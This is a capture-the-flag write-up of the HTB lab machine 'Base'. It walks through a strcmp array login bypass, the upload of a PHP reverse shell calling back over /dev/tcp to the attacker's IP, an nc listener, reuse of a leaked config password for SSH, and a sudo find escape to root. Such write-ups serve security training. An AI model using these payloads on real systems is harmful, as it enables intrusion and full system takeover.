---
tags:
  - Linux
  - HTTP
  - LFI
  - PHP
  - Sudoers
---

... is a simple HTB machine which offers a misconfigured `http` service where directory listing allows you to read the server-side code of a `PHP` file. It insecurely uses the `strcmp` function which allows for the login to be bypassed. A reverse shell payload can then be uploaded and executed. For the privilege escalation, the user is allowed to execute a binary as `root`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to Base
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This again shows a very typical setup of a HTB machine where a web application mis-configuration leads to `ssh` credentials.

### Initial Exploitation
The website displays a home-page for a file hosting service. The page source did not reveal anything of interest. It is funny though, that the CEO in the "Team" section is named "Walter White". The only `href` in the page source which leads to an interesting endpoint is the `href="/login/login.php"`.

The `login.php` displays a login form. Neither default credentials, nor SQL injection payloads work here. A dictionary attack may be used, but i will try forceful browsing first. Instead of using `dirb` like i always do, i want to use `ffuf` this time due to its speed. The following command looks for `php` files in the `/login` sub directory:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://$IP/login/FUZZ.php"
```
And this scan additionally finds the `config.php` file. I try to view it, but a blank page is returned.
So i try to simply visit `http://$IP/login` to see if directory listing is enabled so i can view all files in there, and indeed! I additionally find the `login.php.swp` file, which gets downloaded when visiting it. Google reveals that these files are created by programs like `vim` to ensure that only one person edits the file at the same time. Normally, these files are hidden (e.g. `.login.php.swp`), which is why it is unusual that it is shown in the directory listing, but oh well. The original content of the files can be then viewed with this `vim` command:
```bash
vim -r login.php.swp
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -r: list swap file
```

The recovered file then displays the HTML code to the `login.php` page. Additionally, the server-side authentication logic is also included in the document, as that is how `PHP` works. The logic can be seen here:
```php
<?php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
?>
```

I googled for `php strcmp vulnerabilities` and found [this blog](https://www.mayhemcode.com/2025/10/php-strcmp-vulnerability-explained.html). It turns out that this `PHP` function compares two strings and returns `0` if they are equal, `-1` if the first string is less than the second, and `1` if the first string is greater than the second one. 
The blog explains that if a array is compared to an string, the function refuses to work and returns a `NULL` value. And in `PHP`, this comparison:
```php
if(NULL == 0) {...
```
WILL return `true`. This is because the `==` operator compares two values without checking their types. `===` will actually check their types and return `false`.

What this means for the `login.php` is that if the `username` and `password` in the `POST` requests are `arrays` instead of strings, both comparisons return the value `true`, and the login is bypassed! To do so, i intercept the login `POST` request in `burpsuite` and modify the values as follows before forwarding it:
```http
username[]=admin&password[]=password
```

As an authenticated user, i am allowed to upload files to the base server. I prepare the following `evil.php` file, which initiates a reverse shell connection from the server when rendered.
```php
<?php system('bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"'); ?>
```
I now need to find out where this uploaded file lands so that i can render it to execute its code. As my previous `ffuf` scan did not find any directories which indicate uploaded files, i simply do it again with a bigger word-list. I use `big.txt` instead of `common.txt`:
```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -u "http://$IP/FUZZ"
```
And this finds the directory `/_uploaded`! There, i find my `evil.php`. Before rendering, i start a listener like this:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

This gives me a reverse shell! In the `/home` directory i find the user `john`, but i can't read his `user.txt` flag as the `www-data` user

### Lateral Movement
As the user `www-data` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `john` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

I remember that the `login.php.swp` file checked the user credentials based on a `config.php` file in the current directory. As the `login.php` resides in `/login`, i `cat` the file `/var/www/html/login/config.php`, and it uses the values `$username = "admin"` and `$password = "thisisagoodpassword"`. Maybe `john` reused this password for his `ssh` access...

### Privilege Escalation
With each challenge i try to pick the low-hanging fruits of privilege escalation:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

And `john` is allowed to use `/usr/bin/find` as `root`! On [GTFOBins](https://gtfobins.org/gtfobins/find/#shell) i quickly find the command to become `root` and read the `/root/root.txt`:
```bash
find . -exec /bin/sh \; -quit
```

### Summary

Below is a visualized summary of the exploitation steps used in this machine.

``` mermaid
graph LR
  A[HTTP<br>service] -->|Insecure strcmp| B[Authentication<br>bypass];
  B -->|Upload| C[Arbitrary<br>PHP-code];
  
  D[Arbitrary<br>PHP-code] -->|Read| E[Config<br>file];
  E -->|Password<br>reuse| F[SSH-access]
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>Access] -->|Sudo<br>permission| B[find];
  B -->|execute| D[Command<br>execution<br>as root];
```